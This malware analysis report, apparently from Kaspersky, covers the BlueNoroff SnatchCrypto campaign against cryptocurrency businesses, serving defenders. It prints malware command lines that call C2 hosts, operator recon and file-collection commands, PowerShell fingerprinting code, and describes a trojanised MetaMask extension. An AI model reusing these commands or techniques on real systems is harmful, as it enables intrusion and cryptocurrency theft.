A mysterious group with links to\nLazarus and an unusual financial motivation for an APT. The group seems to work more like a unit\nwithin a larger formation of Lazarus attackers, with the ability to tap into its vast resources: be it\n[malware implants, exploits, or infrastructure. See our earlier publication about BlueNoroff attacks on](https://securelist.com/lazarus-under-the-hood/77908/)\nthe banking sector.\n\nAlso, we have [previously reported on cryptocurrency-focused BlueNoroff attacks. It appears that](https://securelist.com/cryptocurrency-businesses-still-being-targeted-by-lazarus/90019/)\nBlueNoroff shifted focus from hitting banks and SWIFT-connected servers to solely cryptocurrency\nbusinesses as the main source of the group’s illegal income. These attackers even took the long\nroute of building fake cryptocurrency software development companies in order to trick their victims\ninto installing legitimate-looking applications that eventually receive backdoored updates. We\n\n\n-----\n\n[reported about the first variant of such software back in 2018, but there were many other samples to](https://securelist.com/operation-applejeus/87553/)\n[be found, which was later reported by the US CISA (Cybersecurity and Infrastructure Security](https://us-cert.cisa.gov/ncas/alerts/aa21-048a)\nAgency) in 2021.\n\nThe group is currently active (recent activity was spotted in November 2021).\n\n## The latest BlueNoroff’s infection vector\n\nIf there’s one thing BlueNoroff has been very good at, it’s the abuse of trust. Be it an internal bank\nserver communicating with SWIFT infrastructure to issue fraudulent transactions, cryptocurrency\nexchange software installing an update with a backdoor to compromise its own user, or other\nmeans. Throughout its SnatchCrypto campaign, BlueNoroff abused trust in business\ncommunications: both internal chats between colleagues and interaction with external entities.\n\nAccording to our research this year, we have seen BlueNoroff operators stalking and studying\nsuccessful cryptocurrency startups. The goal of the infiltration team is to build a map of interactions\nbetween individuals and understand possible topics of interest. This lets them mount high-quality\nsocial engineering attacks that look like totally normal interactions. A document sent from one\ncolleague to another on a topic, which is currently being discussed, is unlikely to trigger any\nsuspicion. BlueNoroff compromises companies through precise identification of the necessary\npeople and the topics they are discussing at a given time.\n\nIn a simple scenario, it can appear as a notification of a shared document via Google Drive from\none colleague/friend to another:\n\nNote the tiny “X” image – it’s an icon for an image that failed to load. We opened the email on an\noffline system; if the system had been connected to the internet, there would be a real icon for a\nGoogle document loaded from a third-party tracking server that immediately notifies the attacker\nthat the target opened the email.\n\nBut we also observed a slightly more elaborate approach of an email being forwarded from one\ncolleague to another. This works even better for the attacker, because the original email and the\nattachment appear to have already been checked by the forwarding party. Ultimately, it elevates the\n\n\n-----\n\nlevel of trust sufficiently for the document to be opened.\n\nWe haven’t shown the forwarder address as it belongs to an attacked user, but note there is a piece\nof text that reads “via sendgrid.net”. There is no website at sendgrid.net, but it can be a domain\n[owned by a US-based company called Sendgrid, that specializes in email distribution, and email](https://sendgrid.com/)\nmarketing campaigns. According to its website, it offers rich user-tracking capabilities and claims to\nbe sending 90 billion emails every month. It seems to be a legitimate and reputable business, which\nis probably why Gmail accepts MIME header customization (or sender address forgery in the case\nof an attack) with nothing more than the short remark “via sendgrid.net”. We informed Sendgrid of\nthis activity. Of course, many users could easily overlook the remark or simply not know what it\nmeans. The person, whose name was abused here, seems to be in the top management of the\nDigital Currency Group (dcg.co), according to public information. To make it clear, we believe that\nthe employee of the company, or the company itself has nothing to do with this attack or the email.\n\nWhich other company names have they abused? There are many. We have compiled a list of\nnames and logos so you can watch out for them in your inbox.\n\n\n-----\n\n**_The companies, whose logos are displayed here, were chosen by BlueNoroff’s for_**\n**_impersonation in social engineering tricks. Note, this is no proof that the companies listed_**\n**_were compromised._**\n\nIf you recognize them in incoming communication, there’s no reason to panic, but proceed with\ncaution. For example, you can open the incoming documents in a sandboxed or virtualized offline\nenvironment, convert the document to a different format or use a non-standard viewer (i.e., serverside document viewer like GoogleDocs, Collabora Online, ONLYOFFICE, Microsoft Office Online,\netc.).\n\nIn some cases, we saw what looked like the compromise of an existing registered company and the\nsubsequent use of its resources such as social media accounts, messengers and email to initiate\nbusiness interaction with the target. If a venture capital company approaches a startup and sends\nfiles that look like an investment contract or some other promising documents, the startup won’t\nhesitate to open them, even if some risk is involved and Microsoft Office adds warning messages.\n\n\n-----\n\n-----\n\nA compromised LinkedIn account of an actual company representative was used to approach a\ntarget and engage with them. The true company’s website is different from the one referenced in the\nconversation. By manipulating trust in this way, BlueNoroff doesn’t even need to burn valuable 0days. Instead, they can rely on regular macro-enabled documents or older exploits.\n\nWe found they generally stick to CVE-2017-0199, using it again and again before trying something\nelse. The vulnerability initially allowed automatic execution of a remote script linked to a\nweaponized document. The exploit relies on fetching remote content via an embedded URL inside\none of the document meta files. An attentive user may even spot something fishy is happening\nwhile MS Word shows a standard loading popup window.\n\nIf the document was opened offline or the remote content was blocked, it presents some legitimate\ncontent, likely scraped or stolen from another party.\n\n\n-----\n\nIf the document isn’t blocked from connecting to the internet, it fetches a remote template that is\nanother macro-enabled document. The two documents are like two ingredients of an explosive that\nwhen mixed together produce a blast. The first one contains two base64-encoded binary objects\n(one for 32-bit and 64-bit Windows) declared as image data. The second document (the remote\ntemplate) contains a VBA macro that extracts one of these objects, spawns a new process\n(notepad.exe) to inject and execute the binary code. Although the binary objects have JPEG\nheaders, they are actually only PE files with modified headers.\n\nInterestingly, BlueNoroff shows improved opsec at this stage. The VBA macro does a cleanup by\nremoving the binary objects and the reference to the remote template from the original document\nand saving it to the same file. This essentially de-weaponizes the document leaving investigators\nscratching their head during analysis.\n\n\n-----\n\nAdditionally, we’ve seen that this actor utilized an elevation of privilege (EoP) technique in the initial\ninfection stage. According to our telemetry, the word.exe process, created by opening the malicious\ndocument, spawned the legitimate process, dccw.exe. The dccw.exe process is a Windows system\nfile that has auto-elevate permission. Abusing a dccw.exe file is a known [technique and we suspect](https://github.com/L3cr0f/DccwBypassUAC)\nthe malware authors used it to run the next stage malware with high privilege. In another case, we\nhave observed word.exe spawning a notepad.exe that received a malware injection and in turn\nspawning mmc.exe. Unfortunately, the full details of this technique are unavailable due to some\nmissing parts.\n\n\n-----\n\n## Malware infection\n\nWe assess that the BlueNoroff group’s interest in cryptocurrency theft started with the SnatchCrypto\ncampaign that has been running since at least 2017. While tracking this campaign, we’ve seen\nseveral full-infection chains deliver malware. For the initial infection vector, they usually utilized\nzipped Windows shortcut files or weaponized Word documents. Note that this group has various\nmethods in their infection arsenal and assembles the infection chain to suit the situation.\n\n### Infection chain #1. Windows shortcut\n\nThe group has been utilizing this infection vector for a long time. The actor sent an archive-type file\ncontaining a shortcut file and document to the victim. All archives used for the initial infection vector\nhad a similar structure. The archive contained a document file such as Word, Excel or PDF file that\nwas password protected alongside another file disguised as a text file containing the document’s\npassword. This file is in fact a Windows shortcut file used to fetch the next stage payload.\n\n**_Archive file and its contents_**\n\nBefore implanting a Windows executable type backdoor, the malware delivered a Visual Basic\nScript and Powershell Script through multiple stages.\n\n**_Infection chain_**\n\n\n-----\n\nThe fetched VBS file is responsible for fingerprinting the victim by sending basic system information,\nnetwork adapter information, and a process list. Next, the Powershell agent is delivered in encoded\nformat. It also sends the victim’s general information to the C2 server and next Powershell agent,\nwhich is capable of executing commands from the malware operator.\n\n**_VBS and Powershell delivery chain_**\n\nUsing this Powershell agent a full-featured backdoor is created, executing with the command line\nparameter:\n\n1 rundll32.exe %Public%\\wmc.dll,#1 4ZK0gYlgqN6ZbKd/NNBWTJOINDc+jJHOFH/9poQ+or9l\n\nThe malware checks the command line parameter, decoding it with base64 and decrypting it with an\nembedded key. The decrypted data contains:\n\n63429981 63407466 45.238.25[.]2 443\n\nTo verify the parameter’s legitimacy, the malware XORs the second parameter with the 0x5837 hex\nvalue, comparing it with the first parameter. If both values match, the malware returns the decrypted\nC2 address and port. The malware also loads a configuration file\n(%Public%\\Videos\\OfficeIntegrator.dat in this case), decrypting it using RC4. This configuration file\ncontains C2 addresses and the next stage payload path will be loaded. The malware has enriched\nbackdoor functionalities that can control infected machines:\n\nDirectory/File manipulation\nProcess manipulation\n\n\n-----\n\nRegistry manipulation\nExecuting commands\nUpdating configuration\nStealing stored data from Chrome, Putty, and WinSCP\n\nThese are used to deploy other malware tools to monitor the victim: a keylogger and screenshot\ntaker.\n\n### Infection chain #2. Weaponized Word document\n\nAnother infection chain we’ve seen started from a malicious Word document. This is where the\nactor utilized remote template injection (CVE-2017-0199) with an embedded malicious Visual Basic\nScript. In one file (MD5: [e26725f34ebcc7fa9976dd07bfbbfba3) the remotely fetched template refers](https://opentip.kaspersky.com/e26725f34ebcc7fa9976dd07bfbbfba3/?utm_source=SL&utm_medium=SL&utm_campaign=SL)\nto the first stage document and reads the encoded payload from it, injecting it to the legitimate\nprocess.\n\n**_Remote template infection chain_**\n\nThe other case embedded a malicious Visual Basic Script and extracted a Powershell agent on the\nvictim’s system. Going through this initial infection procedure results in a Windows executable\npayload being installed.\n\n\n-----\n\n**_Infection chain_**\n\nThe persistence backdoor #1 is created in the Start menu path for the persistence mechanism and\nspawns the first export function with the C2 address.\n\n1 rundll32.exe \"%appdata%\\microsoft\\windows\\start\nmenu\\programs\\maintenance\\default.rdp\",#1\nhttps://sharedocs[.]xyz/jyrhl4jowfp/eyi8t5sjli/qzrk8blr_q/rnyyuekwun/yzm1ncj8yb/a3q==\n\nUpon execution, the malware generates a unique installation ID based on the combined hostname,\nusername and current timestamp, which are concatenated and hashed using a simple string\nhashing algorithm. After sending a beacon to the C2 server, the malware collects general system\ninformation, sending it after AES encryption. The data received from the server is expected to have\nthe following structure:\n\n@ PROCESS_ID # DLL_FILE_SIZE : DLL_FILE_DATA\n\nThe PROCESS_ID indicates the target process into which the malware will inject a new DLL.\nDLL_FILE_SIZE is the size of the DLL file to inject. And lastly, DLL_FILE_DATA contains the actual\nbinary executable file to inject.\n\nBased on our telemetry, the actor used another type of backdoor. The persistence backdoor #2 is\nused to silently run an additional executable payload that is received over an encrypted channel\nfrom a remote server. The server address is not hardcoded but rather stored in an encrypted file on\nthe disk (%WINDIR%\\AppPatch\\PublisherPolicy.tms), whose path is hardcoded in the backdoor.\nThe decrypted configuration file has an identical structure to the configuration file used in Infection\nchain #1.\n\n\n-----\n\nAs we can see from the above case, the actor behind this campaign delivered the final payload with\nmulti-stage infection and carefully delivered the next payload after checking the fingerprint of the\nvictim. This makes it harder to collect indicators to respond to the attack. With a strict infection\nchain, a full-featured Windows executable type backdoor is installed. This custom backdoor has\nlong been attributed only to the BlueNoroff group, so we strongly believe that The BlueNoroff group\nis behind this campaign.\n\n## Assets theft\n\n### Collecting credentials\n\nOne of the strategies this threat actor usually uses after implanting a full-featured backdoor is the\ncommon discovery and collection strategy used by APT threat actors. We managed to identify\nBlueNoroff’s hands-on activities on one victim and observed that the group delivered the final\npayload very selectively. The malware operator mostly relied on Windows commands when\nperforming initial profiling. They collected user accounts, IP addresses and session information:\n\ncmd.exe /c “query session >%temp%\\TMPBFF2.tmp 2>&1”\ncmd.exe /c “ipconfig /all >%temp%\\TMPEEE2.tmp 2>&1”\ncmd.exe /c “whoami >%temp%\\TMP218C.tmp 2>&1”\ncmd.exe /c “net user [user account] /domain >%temp%\\TMP4B7C.tmp 2>&1”\ncmd.exe /c “net localgroup administrators >%temp%\\TMP9518.tmp 2>&1”\ncmd.exe /c “query session >%temp%\\TMPBFF2.tmp 2>&1”\ncmd.exe /c “ipconfig /all >%temp%\\TMPEEE2.tmp 2>&1”\n\nIn the collection phase, the malware operator also relied on Windows commands. After finding\nfolders of interest, they copied a folder named 策略档案 (Chinese for “Policy file“) to the previously\ncreated “MM” folder for exfiltration. Also, they collected a configuration file related to cryptocurrency\nsoftware in order to extract possible credentials or other account details.\n\ncmd.exe /c “mkdir %public%\\MM >%temp%\\TMPF522.tmp 2>&1”\nxcopy “%user%\\Desktop\\[redacted]工作文档\\MM策略档案” %public%\\MM /S /E /Q /Y\ncmd.exe /c “rd /s /q %public%\\MM >%temp%\\TMP729D.tmp 2>&1”\ncmd.exe /c “type D:\\2\\Crypt[redacted]\\Crypt[redacted].conf >%temp%\\TMP496B.tmp 2>&1″\n\nFrom one victim, we discovered that the operators manually copied a file that was created by one of\nthe monitoring utilities (such as screenshot or keystroke data) to the %TEMP% folder in order to be\nsent to an attacker-controlled remote resource.\n\ncmd.exe /c “copy “%appdata%\\Microsoft\\Feeds\\Creds_5FADD329.dat” %public%\\\n>%temp%\\TMP11C4.tmp 2>&1″\n\n### Stealing cryptocurrency\n\nIn some cases where the attackers realized they had found a prominent target, they carefully\nmonitored the user for weeks or months. They collected keystrokes and monitored the user’s daily\noperations, while planning a strategy for financial theft.\n\n\n-----\n\nIf the attackers realize that the target uses a popular browser extension to manage crypto wallets\n(such as the Metamask extension), they change the extension source from Web Store to local\nstorage and replace the core extension component (backgorund.js) with a tampered version. At\nfirst, they are interested in monitoring transactions. The screenshot below shows a comparison of\ntwo files: a legitimate Metamask background.js file and its compromised variant with injected lines\nof code highlighted in yellow. You can see that in this case they set up monitoring of transactions\nbetween a particular sender and recipient address. We believe they have a vast monitoring\ninfrastructure that triggers a notification upon discovering large transfers.\n\nThe details of the transaction are automatically submitted via HTTP to a C2 server:\n\nIn another case, they realized that the user owned a substantial amount of cryptocurrency, but used\na hardware wallet. The same method was used to steal funds from that user: they intercepted the\ntransaction process and injected their own logic.\n\nAll this sounds easy, but in fact requires a thorough analysis of the Metamask Chrome extension,\nwhich is over 6MB of JavaScript code (about 170,000 lines of code) and implementation of a code\ninjection that rewrites transaction details on demand when the extension is used.\n\n\n-----\n\nThis way, when the compromised user transfers funds to another account, the transaction is signed\non the hardware wallet. However, given that the action was initiated by the user at the very right\nmoment, the user doesn’t suspect anything fishy is going on and confirms the transaction on the\nsecure device without paying attention to the transaction details. The user doesn’t get too worried\nwhen the size of the payment he/she inputs is low and the mistake feels insignificant. However, the\nattackers modify not only the recipient address, but also push the amount of currency to the limit,\nessentially draining the account in one move.\n\nThe injection is very hard to find manually unless you are very familiar with the Metamask\ncodebase. However, a modification of the Chrome extension leaves a trace. The browser has to be\nswitched to Developer mode and the Metamask extension is installed from a local directory instead\nof the online store. If the plugin comes from the store, Chrome enforces digital signature validation\nfor the code and guarantees code integrity. So, if you are in doubt, immediately check your\nMetamask extension and Chrome settings.\n\n\n-----\n\n**_Developer mode enabled in Google Chrome_**\n\n**_If you use Developer mode, make sure your important extensions come from the Web Store_**\n\n**_Unless you are a Metamask developer yourself, this may indicate a Trojanized extension_**\n\n## SnatchCrypto’s victims\n\nThe target of the SnatchCrypto campaign is not limited to specific countries and continents. This\ncampaign is aimed at various companies that by the nature of their work deal with cryptocurrencies\nand smart contracts, DeFi, blockchains, and FinTech industry.\n\nAccording to our telemetry, we discovered victims from Russia, Poland, Slovenia, Ukraine, the\nCzech Republic, China, India, the US, Hong Kong, Singapore, the UAE and Vietnam. However,\nbased on the shortened URL click history and decoy documents, we assess there were more\nvictims of this financially motivated attack campaign.\n\n\n-----\n\n**_BlueNoroff victims_**\n\nIn addition to the above-mentioned countries, we observed uploads of weaponized documents and\ncompromised Metamask extensions from Indonesia, the UK, Sweden, Germany, Bulgaria, Estonia,\nRussia, Malta and Portugal.\n\n## SnatchCrypto’s attribution\n\nWe assess with high confidence that the financially motivated BlueNoroff group is behind this\ncampaign. As a result of understanding the SnatchCrypto campaign’s full chain of infection, we can\nidentify several overlaps with the BlueNoroff group’s previous activities.\n\n### VBA macro authorship\n\nAnalysis of the VBA macro from the remote template used during the initial infection revealed that\nthe code matched the style and technique previously used by Clément Labro, an offensive security\nresearcher from the company SCRT based out of Morges, Vaud, Switzerland. The original code for\nprocess injection from the VBA macro hasn’t been found in the public, so either Clément has\nprivately developed it and later it became available to BlueNoroff, or someone adapted his other\nVBA code, such as [the VBA-RunPE project.](https://github.com/itm4n/VBA-RunPE/blob/master/RunPE.vba)\n\n### PowerShell scripts overlap\n\nOne tool this group relied heavily on is the PowerShell script. Through an initial infection they\ndeployed PowerShell agents on several victims, sending basic system information and executing\ncommands from the control server. They have utilized this PowerShell continuously, while adding\nsmall updates.\n\n\n**PowerShell script used in previous**\n**BlueNoroff campaign**\n\n\n**PowerShell script used in 2021 campaign**\n\n\n-----\n\nfunction GetBasicInformation\n\n{\n$HostName =\n\n[System.Environment]::MachineName;\n\n$UserName =\n\n[System.Environment]::UserName;\n\n$DomainName =\n\n[System.Environment]::UserDomainName;\n\n$CurrentDir =\n\n[System.Environment]::CurrentDirectory;\n\n$BinPath =\n\n[System.Environment]::GetCommandLineArgs()\n\n[0];\n\n$OSVersion =\n\n[System.Environment]::OSVersion.VersionString;\n\n$Is64BitOS =\n\n[System.Environment]::Is64BitOperatingSystem;\n\n$Is64BitProcess =\n\n[System.Environment]::Is64BitProcess;\n\n$PSVersion = ‘PS ‘ +\n\n[System.Environment]::Version;\n\n$BasicInformation = $HostName + ‘|’ +\n$UserName + ‘|’ + $DomainName + ‘|’ +\n$CurrentDir + ‘|’ + $BinPath + ‘|’ + $OSVersion +\n‘|’ + $Is64BitOS + ‘|’ + $Is64BitProcess + ‘|’ +\n$PSVersion;\n\nreturn $BasicInformation;\n\n}function ProcessCommand\n\n{\n\n### Backdoor overlap\n\n\nfunction GetBI\n\n{\n$HostName =\n\n[System.Environment]::MachineName;\n\n$UserName = [System.Environment]::UserName;\n\n$DomainName =\n\n[System.Environment]::UserDomainName;\n\n$CurrentDir =\n\n[System.Environment]::CurrentDirectory;\n\n$BinPath =\n\n[System.Environment]::GetCommandLineArgs()\n\n[0];\n\n$OSVersion =\n\n[System.Environment]::OSVersion.VersionString;\n\n$Is64BitOS =\n\n[System.Environment]::Is64BitOperatingSystem;\n\n$Is64BitProcess =\n\n[System.Environment]::Is64BitProcess;\n\n$PSVersion =\n\n[System.Environment]::Version;$BasicInformation\n= $HostName + ‘|’ + $UserName + ‘|’ +\n$DomainName + ‘|’ + $CurrentDir + ‘|’ + $BinPath\n+ ‘|’ + $OSVersion + ‘|’ + $Is64BitOS + ‘|’ +\n$Is64BitProcess + ‘|’ + $PSVersion;return\n$BasicInformation;\n\n}function ProcessCommand\n\n{\n\n\nThrough the complicated infection chain, a Windows executable type backdoor is eventually\ninstalled on the victim machine. We can only identify this backdoor malware from a few hosts. It has\nmany code similarities with previously known BlueNoroff malware. Using Kaspersky Threat\nAttribution Engine (KTAE), we see that the malware binaries used in this campaign have\nconsiderable code similaritis with known tools of the BlueNoroff group.\n\n**_Code similarity of backdoor_**\n\n\n-----\n\nIn addition, we can identify uncommon techniques usually discovered from the BlueNoroff group s\nmalware. The group’s malware acquires a real C2 address by XORing the resolved IP address with\na hardcoded DWORD value. We saw the same technique in our previous BlueNoroff [report. The](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/07180244/Lazarus_Under_The_Hood_PDF_final.pdf)\nmalware used in the SnatchCrypto campaign also used the same technique to acquire real C2\naddresses.\n\n**_Similar C2 address acquiring scheme_**\n\nIn addition, based on the metadata of the Windows shortcut files, we found that the actor behind\nthis campaign is familiar with the Korean operating system environment.\n\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n\n\n[String Data]\n\nWorking Directory (UNICODE):  %currentdir%\n\nArguments (UNICODE):
